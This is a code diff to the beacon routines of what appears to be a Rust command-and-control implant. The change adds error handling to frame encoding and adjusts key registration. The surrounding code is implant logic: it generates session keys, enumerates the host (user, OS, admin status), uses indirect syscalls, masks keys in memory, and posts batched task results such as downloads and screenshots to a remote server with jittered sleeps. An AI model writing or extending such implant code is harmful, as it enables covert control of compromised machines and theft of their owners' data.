@@ -42,7 +42,7 @@ pub unsafe fn beacon_loop() {
     let kp = ImplantKeypair::generate();
     let key = kp.session_key(&cfg.server_pub);
     // Register the session key (ECDH-derived, 32 bytes) as a maskable region.
-    crate::mem::register_key(key);
+    crate::mem::register_key(*key.as_bytes());
     let pubkey = kp.public_bytes();
 
     // Real host enumeration (replaces the M0 "host"/"user"/0/0x1337 placeholders).
@@ -56,7 +56,7 @@ pub unsafe fn beacon_loop() {
         is_admin: crate::hostinfo::is_admin(),
     };
     let mut info_writer = Writer::new();
-    info.encode(&mut info_writer);
+    info.encode(&mut info_writer).expect("SessionInfo fields are bounded by config (hostname/user/os << MAX_BLOB_LEN)");
     let info_plain = info_writer.into_bytes();
 
     // Borrow the indirect-syscall runtime (initialized by entry). File ops fall
@@ -113,7 +113,7 @@ pub unsafe fn beacon_loop() {
             });
         }
 
-        let frame = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending));
+        let frame = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending).expect("beacon batch encodes within MAX_BLOB_LEN"));
         counter += 1;
         pending.clear();
 
@@ -152,7 +152,7 @@ pub unsafe fn beacon_loop() {
                 // now (a streamed Download/Screenshot can produce a lot).
                 if pending_batch_size(&pending) > BATCH_FLUSH {
                     let frame =
-                        encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending));
+                        encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending).expect("flush batch encodes within MAX_BLOB_LEN"));
                     let _ = crate::transport::post_frame(
                         cfg.server_host.as_bytes(),
                         cfg.server_port,
@@ -189,7 +189,7 @@ pub unsafe fn beacon_oneshot() -> u32 {
     // DIAG step 2: keygen done (if we crash here → CSPRNG or curve25519)
     let key = kp.session_key(&cfg.server_pub);
     // DIAG step 3: session_key (HKDF) done
-    crate::mem::register_key(key);
+    crate::mem::register_key(*key.as_bytes());
     let pubkey = kp.public_bytes();
 
     let info = SessionInfo {
@@ -202,7 +202,7 @@ pub unsafe fn beacon_oneshot() -> u32 {
         is_admin: crate::hostinfo::is_admin(),
     };
     let mut info_writer = Writer::new();
-    info.encode(&mut info_writer);
+    info.encode(&mut info_writer).expect("SessionInfo fields are bounded by config (hostname/user/os << MAX_BLOB_LEN)");
     let info_plain = info_writer.into_bytes();
     let rt = crate::syscalls::global();
 
@@ -236,7 +236,7 @@ pub unsafe fn beacon_oneshot() -> u32 {
     for _ in 0..6 {
         sleep_jitter(2, 0);
         // POST empty batch, receive any queued tasks.
-        let frame = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&[]));
+        let frame = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially"));
         counter += 1;
         let Some(body) = crate::transport::post_frame(
             cfg.server_host.as_bytes(),
@@ -275,7 +275,7 @@ pub unsafe fn beacon_oneshot() -> u32 {
             }
         }
         if !pending.is_empty() {
-            let rframe = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending));
+            let rframe = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending).expect("oneshot tail batch encodes within MAX_BLOB_LEN"));
             counter += 1;
             let _ = crate::transport::post_frame(
                 cfg.server_host.as_bytes(),
